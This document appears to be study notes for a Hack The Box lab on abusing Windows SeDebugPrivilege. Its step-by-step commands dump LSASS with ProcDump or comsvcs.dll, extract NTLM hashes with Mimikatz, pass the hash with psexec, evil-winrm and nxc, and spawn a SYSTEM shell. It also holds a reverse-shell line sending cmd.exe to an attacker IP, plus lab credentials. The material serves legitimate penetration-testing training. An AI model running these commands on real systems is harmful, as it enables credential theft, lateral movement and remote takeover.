# Section 8 — SeDebugPrivilege

> **Lab: yes** — dump LSASS to extract NTLM hash for sccm_svc account.

**Core principle:** `SeDebugPrivilege` grants the ability to attach to and read/write memory of ANY process, regardless of its security descriptor. This means you can dump LSASS (which holds credentials for all logged-in users) or inject into SYSTEM processes to get code execution as SYSTEM.

---

## Why accounts have SeDebugPrivilege

- Developers debugging system components
- Service accounts that need to interact with protected processes
- Misconfiguration — assigned via Group Policy without understanding the risk

**Where to find these users:** LinkedIn recon for developers, then target their accounts during hash cracking (Responder/Inveigh NTLMv2 captures). Developers are more likely to have this privilege.

---

## Two main attack paths

| Path | Method | Result |
|------|--------|--------|
| **LSASS dump** | ProcDump or Task Manager → Mimikatz offline | Extract NTLM hashes for all logged-in users |
| **RCE as SYSTEM** | Inject into/spawn child of SYSTEM process (winlogon, lsass) | Full SYSTEM shell |

---

## Path 1: LSASS memory dump → credential extraction

### Step 1: Confirm SeDebugPrivilege

```cmd
whoami /priv
```
> Look for `SeDebugPrivilege` — state can be `Disabled` (still exploitable, just needs elevated context).

### Step 2: Dump LSASS with ProcDump

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
> `-ma` = full memory dump. Output goes to current directory. File will be ~30-100MB depending on system activity.

**Alternative — dump via Task Manager (if no tools available):**
1. Open Task Manager → Details tab
2. Find `lsass.exe`
3. Right-click → "Create dump file"
4. File saved to `C:\Users\<user>\AppData\Local\Temp\lsass.DMP`

**Alternative — dump via PowerShell (comsvcs.dll, no tools needed):**
```powershell
# Get LSASS PID
$lsassPid = (Get-Process lsass).Id
# Dump using built-in comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\temp\lsass.dmp full
```

### Step 3: Extract credentials with Mimikatz

```cmd
mimikatz.exe
```
```
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
> `log` creates `mimikatz.log` — saves all output to file (critical on busy servers with many creds). `sekurlsa::minidump` loads the dump file. `sekurlsa::logonpasswords` extracts all credential material.

**What you get from the dump:**
| Field | Use |
|-------|-----|
| NTLM hash | Pass-the-hash (psexec, wmiexec, evil-winrm) |
| SHA1 hash | Less common, some tools accept it |
| Cleartext password | Direct logon (only if WDigest is enabled — older systems) |
| Kerberos tickets | Pass-the-ticket if domain-joined |

### Step 4: Use extracted hash

```bash
# Pass-the-hash laterally
psexec.py <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>
nxc smb <TARGET> -u <USER> -H <NTLM_HASH>
```

---

## Path 2: RCE as SYSTEM (process parent injection)

### Using psgetsystem PoC script

```powershell
# Load the script
Import-Module .\psgetsys.ps1

# Find a SYSTEM process PID
tasklist | findstr winlogon
# OR
(Get-Process -Name "winlogon").Id

# Spawn cmd as SYSTEM by inheriting winlogon's token
[MyProcess]::CreateProcessFromParent(<winlogon_PID>, "cmd.exe", "")
```

> Target processes that run as SYSTEM: `winlogon.exe`, `lsass.exe`, `services.exe`, `csrss.exe`

### Without RDP (reverse shell variant)

Modify the PoC to execute a reverse shell instead of interactive cmd:
```powershell
[MyProcess]::CreateProcessFromParent(<PID>, "c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe", "")
```

---

## Comparison: SeDebugPrivilege vs. SeImpersonatePrivilege

| | SeDebugPrivilege | SeImpersonatePrivilege |
|--|-----------------|----------------------|
| **Who has it** | Admins, developers | Service accounts |
| **Attack** | Dump LSASS, inject into SYSTEM processes | Potato/PrintSpoofer token theft |
| **Requires** | Elevated shell (Run as Admin / UAC bypass) | Already available in service context |
| **Best for** | Credential harvesting + lateral movement | Direct SYSTEM escalation |

---

## Lab walkthrough

**Target:** `10.129.43.43` (ACADEMY-WINLPE-SRV01)
**Creds:** `jordan` / `HTB_@cademy_j0rdan!` (RDP)
**Goal:** Extract NTLM hash for `sccm_svc`

### Full attack chain:

```
1. RDP in as jordan (has SeDebugPrivilege)
2. Open elevated PowerShell (Run as Administrator → jordan's creds)
3. Confirm: whoami /priv → SeDebugPrivilege present
4. Dump LSASS: procdump.exe -accepteula -ma lsass.exe lsass.dmp
5. Run Mimikatz:
   mimikatz.exe
   log
   sekurlsa::minidump lsass.dmp
   sekurlsa::logonpasswords
6. Find sccm_svc entry → grab NTLM hash
```

### Commands to run (in elevated shell on target):

```cmd
whoami /priv
cd C:\Tools
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe
```

In Mimikatz:
```
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

> Look for the `sccm_svc` entry — the NTLM hash is the answer.

**Why sccm_svc is in memory:** From Section 4, we saw `sccm_svc` logged in at the console (`query user`). Any user with an active session has credentials cached in LSASS — SeDebugPrivilege lets us read them.

---

## Lab observations & attack chain (WINLPE-SRV01)

```
Section 4: sccm_svc logged in at console (active session)
Section 6: SeDebugPrivilege = attach to any process = dump LSASS
Section 8 (now): jordan has SeDebugPrivilege → dump LSASS → sccm_svc NTLM
    │
    ▼
├── jordan (SeDebugPrivilege) → LSASS dump → credentials for:
│   ├── sccm_svc (NTLM hash) → SCCM service account
│   │   └── Likely has domain-wide access to managed systems
│   │   └── Pass-the-hash → lateral movement across all SCCM clients
│   ├── Any other logged-in users/service accounts
│   └── Machine account hash (WINLPE-SRV01$)
│       └── Can be used for silver ticket attacks if domain-joined
│
├── Alternative path if procdump is blocked:
│   ├── Task Manager → Create dump file (GUI)
│   ├── comsvcs.dll MiniDump (built-in, no tools)
│   └── Direct SYSTEM RCE via psgetsystem → skip credential dump entirely
│
└── Post-exploitation with sccm_svc hash:
    ├── nxc smb 172.16.20.0/23 -u sccm_svc -H <hash> → check lateral reach
    ├── evil-winrm to other hosts
    └── If SCCM admin → deploy payloads to all managed endpoints
```

---

## Key takeaways

- **SeDebugPrivilege = read any process memory.** LSASS holds creds for all active sessions — one dump gives you every logged-in user's NTLM hash.
- **Always check `query user` first.** The users you see logged in are the creds you'll get from LSASS. No active session = no creds in memory.
- **`procdump -ma lsass.exe` is the fastest path** but gets caught by EDR. Fallbacks: Task Manager dump, comsvcs.dll, or direct memory read with custom tools.
- **Always run `log` in Mimikatz first.** On servers with many sessions, output scrolls too fast to read — the log file captures everything.
- **Disabled state doesn't matter** — you just need an elevated context (Run as Administrator / UAC bypass).
- **This privilege is rare on standard users** — but when you find it (developers, IT staff), it's equivalent to full admin access.
